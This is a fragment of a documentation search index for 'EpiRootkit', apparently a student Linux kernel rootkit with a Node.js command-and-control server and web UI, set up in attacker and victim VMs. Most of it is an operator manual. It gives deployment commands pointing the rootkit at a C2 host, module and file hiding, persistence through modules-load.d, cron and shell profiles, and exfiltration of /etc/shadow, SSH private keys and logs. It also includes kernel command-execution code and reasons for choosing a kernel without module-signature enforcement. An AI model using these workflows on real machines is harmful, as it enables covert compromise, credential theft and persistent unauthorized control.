                content: "Overview linkThis section guides you through setting up your host environment, installing and verifying VM disks, and configuring the attacker and victim VMs.\nInitial Setup \u0026 Installation VM Installation \u0026 Verification Attacking VM Setup Victim VM Setup "
            }
        );
    index.add(
            {
                id:  2 ,
                href: "\/docs\/02-setup\/environment\/",
                title: "Initial Setup \u0026 Installation",
                description: "Prepare your host system from scratch for the EpiRootkit project.",
                content: "Host Environment Setup (from a Blank System) link Assumption: You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.\n1. Update System link sudo apt update \u0026\u0026 sudo apt upgrade -y 2. Install Essential Packages linkInstall all required tools for virtualization, development, and Node.js:\nsudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm Tip: If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use uname -r and apt search linux-headers to check.\n3. (Optional but Recommended) Install pnpm linkpnpm is used for the Web UI. Install it globally:\nsudo npm install -g pnpm 4. Enable and Start libvirt link sudo systemctl enable --now libvirtd 5. Add Your User to the libvirt Group link sudo usermod -aG libvirt $USER # Log out and log back in, or run: newgrp libvirt 6. Verify Virtualization Support linkCheck that KVM modules are loaded:\nlsmod | grep kvm You should see kvm and kvm_intel (or kvm_amd).\nIf not, check if virtualization is enabled in your BIOS:\negrep -c '(vmx|svm)' /proc/cpuinfo # output == 0 -\u003e not activated # output \u003e= 1 -\u003e activated warning If virtualization is not enabled, reboot and enable it in your BIOS/UEFI settings. 7. Verify Node.js, npm, and pnpm link node -v npm -v pnpm -v # (if installed) All should print a version number. If not, check your installation steps above.\n8. Review Helper Scripts link scripts/check_vms.sh: Checks for VM disks and ISO, provides download URLs for missing items. scripts/run_vms.sh: Sets up a NAT network (static200) and launches both VMs. 9. Next Steps link Proceed to "
            }
        );
    index.add(
            {
                id:  3 ,
                href: "\/docs\/02-setup\/vm-installation\/",
                title: "VM Installation \u0026 Verification",
                description: "Set up and verify the attacker and victim VMs from scratch.",
                content: "Virtual Machine Installation \u0026 Verification link You must have completed "
            }
        );
    index.add(
            {
                id:  4 ,
                href: "\/docs\/02-setup\/attacking-vm-setup\/",
                title: "Attacking VM Setup",
                description: "Configure and use the attacking VM",
                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nUsage link Ensure the attacker.qcow2 disk is in the vm/ directory (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification). Launch the attacking VM with: sudo ./scripts/run_vms.sh attacker Or both VMs with: sudo ./scripts/run_vms.sh On the attacking VM: Auto-login is enabled for user attacker (no password prompt). The static IP is 192.168.200.11. The password is jules. For more details on the network configuration and helper scripts, see Initial Setup \u0026 Installation.\n"
            }
        );
    index.add(
            {
                id:  5 ,
                href: "\/docs\/02-setup\/victim-vm-setup\/",
                title: "Victim VM Setup",
                description: "Configure and use the victim VM to load EpiRootkit",
                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nPlace the victim.qcow2 disk in the vm/ directory at the project root (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification).\nLaunch the victim VM with:\nsudo ./scripts/run_vms.sh victim Or both VMs with:\nsudo ./scripts/run_vms.sh On the victim VM:\nThe VM has auto-login enabled for the victim user (no password prompt). Its static IP is 192.168.200.10. The password is jules. When finished, close the QEMU window or use Ctrl+C on the host script to shut down both VMs.\n"
            }
        );
    index.add(
            {
                id:  6 ,
                href: "\/docs\/03-attacking-program\/",
                title: "Attacking Program (C2 Server)",
                description: "C2 server for EpiRootkit management with CLI interface and Web UI",
                content: ""
            }
        );
    index.add(
            {
                id:  7 ,
                href: "\/docs\/03-attacking-program\/overview\/",
                title: "Overview",
                description: "C2 server architecture and capabilities",
                content: "Attacking Program Overview linkProfessional C2 (Command \u0026 Control) server for managing EpiRootkit connections.\nQuick Start link cd attacking_program pnpm install pnpm start Ports:\nC2 Server: 4444 Web Interface: 3000 Architecture linkComponents link CLI Interface: Vorpal.js interactive command system C2 Server: TCP server for rootkit connections (port 4444) Web Interface: Express.js + Socket.IO REST API (port 3000) Client Manager: Connection lifecycle and authentication Event System: Real-time logging and notifications Technology Stack link Runtime: Node.js 18+ with pnpm CLI: Vorpal.js for commands Web: Express.js + Socket.IO Encryption: XOR cipher (optional) Core Features linkClient Management link ls # List connected clients auth Client-1 password # Authenticate with client status Client-1 # Get rootkit status keepalive Client-1 # Check connection health Remote Operations link exec Client-1 whoami # Execute commands upload Client-1 ./file.txt /tmp/file.txt # Upload files download Client-1 /etc/passwd ./passwd # Download files Configuration link config Client-1 # Interactive configuration persist Client-1 install # Manage persistence Authentication linkSHA-512 Password System link C2 sends plaintext password Rootkit hashes and compares Session established (1-hour timeout) Rate limiting: 5 attempts/60 seconds Default Credentials:\nPassword: password Hash: b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 Configuration linkEnvironment Settings link C2_PORT=4444 # C2 server port WEB_PORT=3000 # Web interface port ENCRYPTION_KEY=secret32hex # 32-character hex key ENABLE_ENCRYPTION=true # XOR encryption toggle PASSWORD_HASH=hash # SHA-512 password hash Security Features link Authentication: SHA-512 with brute force protection Encryption: Optional XOR cipher for traffic obfuscation Session Management: Automatic timeout and cleanup Access Control: Commands require authentication Health Monitoring: Automatic stale client detection Network Protocol linkCommand Format link { \"type\": \"command\", \"command\": \"exec\", \"data\": \"whoami\" } Response Format link { \"type\": \"response\", \"success\": true, \"data\": \"root\" } Web Interface linkFeatures link Dashboard: Client overview and status Terminal: Interactive command execution File Transfer: Upload/download with drag-drop Configuration: Toggle rootkit settings Logs: Real-time event monitoring API Endpoints link GET /api/clients - List clients POST /api/auth - Authenticate client POST /api/command - Execute command POST /api/upload - Upload file GET /api/download - Download file "
            }
        );
    index.add(
            {
                id:  8 ,
                href: "\/docs\/03-attacking-program\/installation\/",
                title: "Installation",
                description: "Step-by-step installation and setup guide",
                content: "Installation Guide linkSetup instructions for the EpiRootkit C2 server.\nPrerequisites linkRequired Software link Node.js: Version 18+ pnpm: Package manager (recommended) Verify Installation link node --version # v18.17.0 pnpm --version # 8.6.2 # Install pnpm if missing npm install -g pnpm Installation link1. Install Dependencies link cd attacking_program pnpm install # ‚úì Dependencies installed successfully 2. Review Configuration link cat config.env Default Settings:\n# Server ports C2_PORT=4444 # C2 server port WEB_PORT=3000 # Web interface port # Authentication (SHA-512 of \"password\") PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 # Encryption ENCRYPTION_KEY=0123456789abcdef0123456789abcdef # 32-char hex key ENABLE_ENCRYPTION=true 3. Start Server link pnpm start # ‚úì Server started on port 4444 # ‚úì Web interface started on port 3000 # c2-server$ Verification linkCLI Interface link # Test CLI commands help # EpiRootkit C2 Commands # clients - List connected clients # auth - Authenticate with client # ... ls # No clients connected (initially) Web Interface linkAccess at: http://localhost:3000\nLogin with password: password Dashboard shows connected clients All CLI features available via web Configuration Options linkChange Ports link # Edit config.env C2_PORT=8080 # Custom C2 port WEB_PORT=8000 # Custom web port Change Password link # Generate new SHA-512 hash echo -n \"newpassword\" | sha512sum # Copy the hash to config.env as PASSWORD_HASH Disable Encryption link # Edit config.env ENABLE_ENCRYPTION=false Quick Test link1. Connect Rootkit (victim machine) link sudo insmod epirootkit.ko # C2 shows: ‚úì Client-1 Connected 2. Authenticate link auth Client-1 password # ‚úì Authenticated # SUCCESS: Authentication successful 3. Test Commands link exec Client-1 whoami # Exit code: 0 # Output: root status Client-1 # EpiRootkit Status: Version 1.0.0, Authentication: YES "
            }
        );
    index.add(
            {
                id:  9 ,
                href: "\/docs\/03-attacking-program\/commands\/",
                title: "Command Reference",
                description: "Complete reference for all C2 server commands",
                content: "Command Reference linkComplete reference for all C2 server commands.\nCommand List link Command Description Auth Required clients, ls List connected clients No auth Authenticate with client No exec Execute shell commands Yes upload [remote] Upload files to victim Yes download [local] Download files from victim Yes status Get rootkit status Yes keepalive Check connection status Yes persist [action] Manage persistence Yes config Interactive configuration Yes Client Management linkList Clients link ls # List all connected clients # ‚Ä¢ Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # ‚Ä¢ Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM clients # Same as ls Authentication link auth Client-1 password # Authenticate with client # ‚úì [2025-05-25 16:13:29] Authenticated # SUCCESS: Authentication successful auth Client-1 wrongpass # Wrong password # ERROR: Authentication failed Features:\nSHA-512 password hashing Rate limiting (5 attempts/60 seconds) Session timeout (1 hour) Default password: password Command Execution link exec Client-1 whoami # Exit code: 0 # Output: root exec Client-1 uname -a # Exit code: 0 # Output: Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux exec Client-1 ps aux | head -5 # Exit code: 0 # Output: # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # root 2 0.0 0.0 0 0 ? S 15:00 0:00 [kthreadd] Features:\nRoot privileges execution Full stdout/stderr capture Exit code display Real-time output File Transfer linkUpload Files link upload Client-1 ./file.txt /tmp/file.txt # Upload to specific path # ‚úì File uploaded successfully (1024 bytes) upload Client-1 ./script.sh # Upload to current directory # ‚úì File uploaded successfully (512 bytes) Download Files link download Client-1 /etc/passwd ./passwd # Download to specific path # ‚úì File downloaded successfully (2048 bytes) download Client-1 /etc/hostname # Download to current directory # ‚úì File downloaded successfully (64 bytes) Features:\nBase64 encoding Path validation Binary/text file support Automatic path resolution System Information linkStatus Check link status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Connection: CONNECTED # Module Hidden: YES # File Hiding: YES # Persistence: ENABLED Output:\nVersion information Authentication status Module hiding state Persistence status Connection Check link keepalive Client-1 # Keepalive Status: # Last ping: 2025-05-25 16:14:00 # Last pong: 2025-05-25 16:14:00 # Failed pings: 0 # Connection: STABLE Output:\nLast ping/pong times Failed ping count Connection stability Reconnection attempts Persistence Management link persist Client-1 install # Install all mechanisms # SUCCESS: All persistence mechanisms installed persist Client-1 remove # Remove all mechanisms # SUCCESS: All persistence mechanisms removed persist Client-1 modules # modules-load.d only # SUCCESS: modules-load.d persistence installed Configuration linkInteractive Config link config Client-1 # ‚îå‚îÄ Configuration - Client-1 # Current Configuration: # [X] Module Hiding (Click to disable) # [X] File Hiding (Click to disable) # [X] Persistence (Click to disable) # # ? Select option: [Use arrow keys] Available Settings:\nModule hiding toggle File hiding toggle Persistence management Connection parameters Direct Commands link # Stealth features hide_module Client-1 # Hide rootkit module # SUCCESS: Module hidden unhide_module Client-1 # Show rootkit module # SUCCESS: Module visible hide_files Client-1 # Enable file hiding # SUCCESS: File hiding enabled unhide_files Client-1 # Disable file hiding # SUCCESS: File hiding disabled Error Handling linkAuthentication Errors link ` "
            }
        );
    index.add(
            {
                id:  10 ,
                href: "\/docs\/03-attacking-program\/usage\/",
                title: "Usage Guide",
                description: "Comprehensive usage scenarios and workflows",
                content: "Usage Guide linkComplete workflows for the EpiRootkit C2 server.\nQuick Start link1. Start C2 Server link cd attacking_program pnpm start # ‚úì Server started on port 4444 # ‚úì Web interface started on port 3000 2. Install Rootkit (Victim) link sudo insmod epirootkit.ko # C2 server shows: ‚úì Client-1 Connected 3. Authenticate link auth Client-1 password # ‚úì [2025-05-25 16:13:30] Authenticated # SUCCESS: Authentication successful Basic Workflows linkClient Management link # List clients ls # ‚Ä¢ Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # ‚Ä¢ Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM # Check status status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Module Hidden: YES # Persistence: ENABLED # Monitor connection keepalive Client-1 # Last ping: 2025-05-25 16:14:00 # Connection: STABLE Command Execution link # System reconnaissance exec Client-1 whoami # Exit code: 0 # Output: root exec Client-1 uname -a # Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux exec Client-1 ps aux | head -5 # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # Network information exec Client-1 ip addr show exec Client-1 netstat -tuln File Transfer link # Upload files upload Client-1 ./script.sh /tmp/script.sh # ‚úì File uploaded successfully (512 bytes) exec Client-1 chmod +x /tmp/script.sh exec Client-1 /tmp/script.sh # Download files download Client-1 /etc/passwd ./passwd # ‚úì File downloaded successfully (2048 bytes) download Client-1 /home/user/.ssh/id_rsa ./keys/ # ‚úì File downloaded successfully (1679 bytes) Advanced Workflows linkPersistence Setup link # Install all persistence mechanisms persist Client-1 install # SUCCESS: All persistence mechanisms installed # Test persistence (victim reboots) exec Client-1 reboot # Wait for reconnection... ls # ‚Ä¢ Client-1 - UNAUTHENTICATED - Last seen: Just now auth Client-1 password status Client-1 # Persistence: ENABLED (survived reboot) Stealth Operations link # Check current stealth status status Client-1 # Module Hidden: YES # File Hiding: YES # Test module hiding exec Client-1 lsmod | grep epirootkit # (no output - module hidden) # Test file hiding exec Client-1 touch /tmp/epirootkit_test exec Client-1 ls /tmp/ | grep epirootkit # (no output - file hidden) # But file still accessible exec Client-1 cat /tmp/epirootkit_test # (works normally) Configuration Management link # Interactive configuration config Client-1 # ‚îå‚îÄ Configuration - Client-1 # [X] Module Hiding (Click to disable) # [X] File Hiding (Click to disable) # [X] Persistence (Click to disable) # Direct commands hide_module Client-1 # SUCCESS: Module hidden unhide_module Client-1 # SUCCESS: Module visible hide_files Client-1 # SUCCESS: File hiding enabled Real-World Scenarios linkInitial Compromise link # 1. Gain foothold auth Client-1 password # 2. Reconnaissance exec Client-1 id exec Client-1 hostname exec Client-1 cat /etc/os-release # 3. Enable stealth hide_module Client-1 hide_files Client-1 # 4. Establish persistence persist Client-1 install Data Exfiltration link # System information download Client-1 /etc/passwd download Client-1 /etc/shadow download Client-1 /etc/hosts # User data download Client-1 /home/user/.bash_history download Client-1 /home/user/.ssh/known_hosts # Log files download Client-1 /var/log/auth.log download Client-1 /var/log/syslog Lateral Movement Preparation link # Network reconnaissance exec Client-1 ip route show exec Client-1 arp -a exec Client-1 ss -tulpn # Upload tools upload Client-1 ./tools/nmap /tmp/scanner upload Client-1 ./tools/linpeas.sh /tmp/enum.sh exec Client-1 chmod +x /tmp/scanner /tmp/enum.sh # Execute reconnaissance exec Client-1 /tmp/enum.sh \u003e /tmp/results.txt download Client-1 /tmp/results.txt ./recon/ Persistence Testing link # Before reboot status Client-1 persist Client-1 install # Simulate reboot exec Client-1 sudo systemctl reboot # Connection lost... # After victim reboots (auto-reconnect) ls # ‚Ä¢ Client-1 - UNAUTHENTICATED - Last seen: Just now auth Client-1 password status Client-1 # Persistence: ENABLED ‚úì Error Handling linkCommon Issues link # Client not found auth Client-999 password # ERROR: Client not found # Authentication failed auth Client-1 wrongpass # ERROR: Authentication failed # Rate limiting auth Client-1 wrong1 auth Client-1 wrong2 # ... (after 5 attempts) # ERROR: Rate limited. Try again in 60 seconds # Command on unauthenticated client exec Client-1 whoami # ERROR: Client not authenticated Connection Issues link # Check connection status keepalive Client-1 # Failed pings: 3 # Connection: UNSTABLE # Client disconnected exec Client-1 whoami # ERROR: Client disconnected # Network timeout download Client-1 /huge/file.bin # ERROR: Network timeout "
            }
        );
    index.add(
            {
                id:  11 ,
                href: "\/docs\/04-web-ui\/",
                title: "Web UI (C2 Frontend)",
                description: "Modern React-based web interface for EpiRootkit C2 server management",
                content: ""
            }
        );
    index.add(
            {
                id:  12 ,
                href: "\/docs\/04-web-ui\/overview\/",
                title: "Overview",
                description: "Modern web interface for EpiRootkit C2 server",
                content: "Web UI Overview linkModern React-based web interface for EpiRootkit C2 server management.\nQuick Start link # Start C2 server with Web UI ./deploy_c2.sh # Access Web UI at http://localhost:3000 # Default password is secret123 Architecture linkTechnology stack and integration.\nFrontend: React 18 + Vite Backend: Express.js + Socket.IO Authentication: JWT with session management Real-time: WebSocket connections "
            }
        );
    index.add(
            {
                id:  13 ,
                href: "\/docs\/04-web-ui\/installation\/",
                title: "Installation \u0026 Setup",
                description: "How to install and launch the Web UI",
                content: "Installation \u0026 Setup linkThe Web UI is integrated with the C2 server and launches automatically.\nPrerequisites linkSystem requirements for running the Web UI.\nNode.js: v18+ pnpm: v8+ (recommended) or npm OS: Ubuntu 20.04+ or similar Linux distribution Installation linkQuick setup process.\n# On the root of the project ./deploy_c2.sh "
            }
        );
    index.add(
            {
                id:  14 ,
                href: "\/docs\/04-web-ui\/features\/",
                title: "Features",
                description: "Web UI capabilities and components",
                content: "Web UI Features linkModern React interface for EpiRootkit C2 server management.\nCore Features link "
            }
        );
    index.add(
            {
                id:  15 ,
                href: "\/docs\/04-web-ui\/features\/authentication\/",
                title: "Authentication",
                description: "Secure login with JWT tokens and session management",
                content: "Authentication linkSecure login with JWT tokens and automatic session management.\nFeatures link JWT Authentication: Secure token-based login system Auto-logout: Automatic logout when session expires (1 hour) Client Authentication: Authenticate individual rootkit clients Persistent Sessions: Survives browser refresh "
            }
        );
    index.add(
            {
                id:  16 ,
                href: "\/docs\/04-web-ui\/features\/dashboard\/",
                title: "Dashboard",
                description: "Real-time client monitoring and statistics",
                content: "Dashboard linkMain interface for monitoring connected rootkit clients with real-time statistics.\nFeatures link Live Statistics: Total, active, and authenticated client counts Grid/Table Views: Switch between visual cards and detailed table Real-time Search: Filter clients by ID, IP, or status Status Indicators: Color-coded connection states (Green/Yellow/Red) Quick Actions: One-click authentication and client management "
            }
        );
    index.add(
            {
                id:  17 ,
                href: "\/docs\/04-web-ui\/features\/client-management\/",
                title: "Client Management",
                description: "Monitor and interact with connected rootkit clients",
                content: "Client Management linkMonitor and interact with connected rootkit clients in real-time.\nFeatures link Connection Status: Visual indicators (Green/Yellow/Red) for client state Client Authentication: Secure password-based client authentication Real-time Updates: Live connection and status changes via WebSocket Client Information: ID, IP address, last seen timestamps Health Monitoring: Automatic stale client detection and alerts "
            }
        );
    index.add(
            {
                id:  18 ,
                href: "\/docs\/04-web-ui\/features\/panels\/terminal-panel\/",
                title: "Terminal Panel",
                description: "Remote command execution interface with terminal emulation",
                content: "Terminal Panel linkFull terminal emulator for remote command execution with history and real-time output.\nFeatures link Command History: Navigate with ‚Üë/‚Üì arrow keys Real-time Output: Live command execution streaming Quick Commands: One-click shortcuts for common operations Status Indicators: Visual execution and connection status Clean Display: Parsed output without C2 metadata "
            }
        );
    index.add(
            {
                id:  19 ,
                href: "\/docs\/04-web-ui\/features\/panels\/",
                title: "UI Panels",
                description: "Individual Web UI panel components",
                content: ""
            }
        );
    index.add(
            {
                id:  20 ,
                href: "\/docs\/04-web-ui\/features\/panels\/persistence-panel\/",
                title: "Persistence Panel",
                description: "Boot persistence configuration and management",
                content: "Persistence Panel linkConfigure rootkit boot survival with multiple persistence methods and one-click setup.\nFeatures link Module System Boot: systemd modules-load.d (recommended) Cron Scheduled Task: Periodic 5-minute checks Profile Login Trigger: Shell profile modification Quick Setup: One-click recommended installation Status Indicators: Visual active/inactive states "
            }
        );
    index.add(
            {
                id:  21 ,
                href: "\/docs\/04-web-ui\/features\/panels\/event-log-panel\/",
                title: "Event Log Panel",
                description: "Activity and event monitoring interface",
                content: "Event Log Panel linkReal-time activity monitoring with filtering, search, and export capabilities.\nFeatures link Real-time Events: Connection, authentication, and command events Event Filtering: Filter by type, category, and time period Search Functionality: Text search with regex support Export Logs: Download events as JSON for analysis Color Coding: Visual event type identification "
            }
        );
    index.add(
            {
                id:  22 ,
                href: "\/docs\/04-web-ui\/features\/panels\/upload-download-panel\/",
                title: "Upload/Download Panel",
                description: "File transfer interface with drag-and-drop support",
                content: "Upload/Download Panel linkFile transfer interface with drag-and-drop upload and remote file browser.\nFeatures link Drag-and-Drop Upload: Large drop zone for easy file uploads Remote File Browser: Navigate and download from target filesystem Progress Tracking: Real-time transfer progress bars Transfer History: Track all upload/download operations Error Handling: Clear error messages and retry options "
            }
        );
    index.add(
            {
                id:  23 ,
                href: "\/docs\/04-web-ui\/features\/panels\/overview-panel\/",
                title: "Overview Panel",
                description: "Client status and quick actions dashboard",
                content: "Overview Panel linkClient status dashboard with connection monitoring and quick action buttons.\nFeatures link Connection Status: Real-time health and connection indicators Authentication Status: Session state and security level System Information: Client ID, IP address, and OS details Quick Actions: One-click authentication and management Visual Indicators: Color-coded status with progress animations "
            }
        );
    index.add(
            {
                id:  24 ,
                href: "\/docs\/04-web-ui\/features\/panels\/configuration-panel\/",
                title: "Configuration Panel",
                description: "Rootkit settings and configuration management",
                content: "Configuration Panel linkManage rootkit stealth and security settings with toggle switches and real-time updates.\nFeatures link Module Hiding: Toggle rootkit visibility in system Persistence: Configure boot survival mechanisms Communication Encryption: Secure C2 communication Real-time Updates: Changes applied immediately Status Indicators: Visual feedback for all settings "
            }
        );
    index.add(
            {
                id:  25 ,
                href: "\/docs\/04-web-ui\/features\/panels\/authentication-panel\/",
                title: "Authentication Panel",
                description: "Client authentication management and security interface",
                content: "Authentication Panel linkSecure two-layer authentication system for rootkit client access and control.\nHow It Works linkThe authentication system has two layers:\nWeb UI Login: JWT authentication to access the C2 interface Client Authentication: Per-client password authentication for rootkit control Client Authentication Process link When you click ‚ÄúAuthenticate‚Äù on a client card:\nModal opens: Password input dialog appears Credential submission: Password sent to rootkit client via C2 server Rootkit verification: Client validates password against stored hash Session establishment: Authenticated session created for client operations Security Features link Password hashing: SHA-512 verification on client side Session timeout: Authentication expires after inactivity Per-client auth: Each client requires individual authentication Failed attempt tracking: Monitor and log authentication failures Secure transmission: Encrypted credential transfer via C2 channel "
            }
        );
    index.add(
            {
                id:  26 ,
                href: "\/docs\/05-epirootkit\/",
                title: "EpiRootkit",
                description: "Linux kernel rootkit implementation for kernel 5.4.0",
                content: ""
            }
        );
    index.add(
            {
                id:  27 ,
                href: "\/docs\/05-epirootkit\/configuration-justifications\/",
                title: "Configuration Justifications",
                description: "Justification for Ubuntu 20.04 LTS / Linux 5.4.x",
                content: " info This page explains why we chose Ubuntu 20.04 LTS with the 5.4.x kernel for our rootkit development and testing. Environment link OS: Ubuntu 20.04 LTS (Focal Fossa) Kernel: 5.4.x (LTS) Why Ubuntu 20.04 LTS? link check_circle Perfect balance between realism and convinience. Widely deployed on servers and desktops Official cloud and container images simplify automation Already uses interesting kernel version (5.4.x) so no need to compile. Why Kernel 5.4.x? link info Balances modern hooking APIs with exported symbols and no mandatory module signing. Full ftrace support\nKernel 4.1+ stabilized the ftrace API (ftrace_set_filter_ip(), register_ftrace_function()). 5.4.x includes every hook we need. Exported kallsyms_lookup_name()\nUp through 5.6 the symbol remains exported. Allows us to resolve sys_call_table at runtime‚Äìno kernel recompilation. Unsigned module loading\nKernels ‚â• 5.7 often enforce module signatures or Secure Boot lockdown. Ubuntu 20.04‚Äôs 5.4.x ships without these restrictions by default. Already compiled in Ubuntu 20.04 LTS\nAs mentionned before Ubuntu 20.04 LTS comes already packing with kernel version 5.4.x making it very easy for us to use and deploy. Alternative Options link Kernel 5.6 Technically we could go until kernel version 5.6 but for practical reasons mentionned above, we went with 5.4.x. Wich in my opinion is still relevant because in LTS. Debian 11 (5.10.x) Still exports our symbols‚Äìrequires disabling module signature checks. warning If we experiment on kernels ‚â• 5.7, we need to append module.sig_enforce=0 to the boot parameters to allow unsigned modules. "
            }
        );
    index.add(
            {
                id:  28 ,
                href: "\/docs\/05-epirootkit\/overview\/",
                title: "EpiRootkit Overview",
                description: "Linux kernel rootkit for Ubuntu 20.04 / kernel 5.4.0",
                content: "EpiRootkit linkLinux kernel rootkit implementation for Ubuntu 20.04 LTS (kernel 5.4.0).\nFeatures link C2 Communication: TCP connection with domain support DNS Resolution: Kernel-space domain name resolution Remote Commands: Execute shell commands with output capture File Transfer: Upload/download files between C2 and victim Authentication: SHA-512 password verification with rate limiting Stealth: Hide module from lsmod and files from directory listings Persistence: Multiple mechanisms to survive reboots Quick Demo link # 1. Build and deploy cd rootkit \u0026\u0026 make sudo ./deploy_rootkit.sh address=c2.example.com port=443 # 2. Start C2 server cd attacking_program \u0026\u0026 pnpm start # 3. Use rootkit auth Client-1 password # SUCCESS: Authentication successful exec Client-1 whoami # Exit code: 0 # Output: root status Client-1 # EpiRootkit Status: Version 1.0.0, Module Hidden: YES Core Components linkNetwork Layer link Connection Management: Persistent TCP with auto-reconnect DNS Resolution: See "
            }
        );
    index.add(
            {
                id:  29 ,
                href: "\/docs\/05-epirootkit\/deployment\/",
                title: "Build \u0026 Deployment",
                description: "How to build and load EpiRootkit on Ubuntu 20.04",
                content: "Build \u0026 Deployment linkHow to build and deploy EpiRootkit on Ubuntu 20.04 with kernel 5.4.0.\nRequirements linkSystem link OS: Ubuntu 20.04 LTS Kernel: 5.4.0-* (check with uname -r) Architecture: x86_64 Dependencies link sudo apt update sudo apt install -y build-essential linux-headers-$(uname -r) Configuration linkEdit rootkit/core/config.h before building:\n// Option 1: Domain name (recommended) #define C2_SERVER_ADDRESS \"jules-c2.example.com\" #define C2_SERVER_PORT 4444 // Option 2: IP address (traditional) #define C2_SERVER_ADDRESS \"192.168.64.1\" #define C2_SERVER_PORT 4444 // Feature settings #define ENABLE_ENCRYPTION 0 // Encryption disabled #define ENABLE_PERSISTENCE 1 // Auto-install persistence #define ENABLE_MODULE_HIDING 1 // Hide module by default #define ENABLE_FILE_HIDING 1 // Hide files with prefixes Build Process link cd rootkit make clean \u0026\u0026 make # ‚úì Build successful: epirootkit.ko created # Verify build ls -la epirootkit.ko file epirootkit.ko # epirootkit.ko: ELF 64-bit LSB relocatable, x86-64 Deployment linkMethod 1: Deployment Script (Recommended) link # Deploy with domain name sudo ./deploy_rootkit.sh address=jules_chef_de_majeur.epirootkit.com # Deploy with IP address sudo ./deploy_rootkit.sh address=192.168.1.100 port=4444 # Deploy with defaults from config.h sudo ./deploy_rootkit.sh What it does:\nValidates module and root privileges Deploys to /lib/modules/$(uname -r)/extra/ Sets up autoload via /etc/modules-load.d/ Updates dependencies with depmod -a Loads module immediately Verifies deployment Method 2: Manual Loading link # Load with domain sudo insmod epirootkit.ko address=jules_chef_de_majeur.epirootkit.com # Load with IP sudo insmod epirootkit.ko address=192.168.1.100 port=4444 # Load with defaults sudo insmod epirootkit.ko Verification linkCheck Loading link # Check if loaded (may be hidden if stealth enabled) lsmod | grep epirootkit # Alternative check if module is hidden ls -la /sys/module/epirootkit Domain Support linkThe rootkit supports both domain names and IP addresses for C2 connectivity.\nFor complete DNS resolution details, see "
            }
        );
    index.add(
            {
                id:  30 ,
                href: "\/docs\/05-epirootkit\/connection-authentication\/",
                title: "Connection \u0026 Authentication",
                description: "How the rootkit connects to C2 server and authenticates",
                content: "Connection \u0026 Authentication linkHow EpiRootkit connects to the C2 server and handles authentication with domain support.\nConnection Process linkAutomatic Connection linkWhen the rootkit loads, it automatically:\nStarts connection thread (epirootkit_conn) Resolves domain (if address is domain name) - see "
            }
        );
    index.add(
            {
                id:  31 ,
                href: "\/docs\/05-epirootkit\/features\/",
                title: "Features",
                description: "EpiRootkit core functionality and capabilities",
                content: ""
            }
        );
    index.add(
            {
                id:  32 ,
                href: "\/docs\/05-epirootkit\/features\/command-execution\/",
                title: "Command Execution",
                description: "Execute shell commands remotely with full output capture",
                content: "Command Execution linkExecute shell commands remotely through the rootkit with full output capture.\nHow It Works link C2 sends command via network Rootkit executes using call_usermodehelper() with /bin/sh -c Captures output by redirecting to temporary file Returns result with exit code and output Implementation linkCommand Handler link static int handle_exec(const char *data) { char *argv[] = { \"/bin/sh\", \"-c\", command_copy, NULL }; char *envp[] = { \"HOME=/\", \"PATH=/sbin:/bin:/usr/bin:/usr/local/bin\", NULL }; // Generate unique temporary filename snprintf(temp_filename, sizeof(temp_filename), \"/tmp/epirootkit_out_%d\", atomic_inc_return(\u0026exec_counter)); // Build command with output redirection snprintf(full_command, command_len + temp_len + 32, \"%s \u003e %s 2\u003e\u00261\", data, temp_filename); // Execute and capture output ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC); return send_result(formatted_result); } Output Capture link Redirection: command \u003e /tmp/epirootkit_out_X 2\u003e\u00261 File reading: Uses kernel_read() to get output Dynamic allocation: vmalloc() for large outputs (up to 64KB) Cleanup: Automatic temporary file removal Usage linkWebUI Terminal linkInteractive terminal interface with:\nCommand input: Type commands directly Real-time output: Immediate response display Command history: Previous commands accessible Exit codes: Color-coded success/failure indicators Example C2 Commands link # System information exec Client-1 whoami exec Client-1 uname -a exec Client-1 ps aux # File operations exec Client-1 ls -la /etc exec Client-1 cat /etc/passwd exec Client-1 find /var/log -name \"*.log\" # Network reconnaissance exec Client-1 netstat -tuln exec Client-1 ss -tulpn exec Client-1 iptables -L "
            }
        );
    index.add(
            {
                id:  33 ,
                href: "\/docs\/05-epirootkit\/features\/file-transfer\/",
                title: "File Transfer",
                description: "Upload and download files between C2 server and victim system",
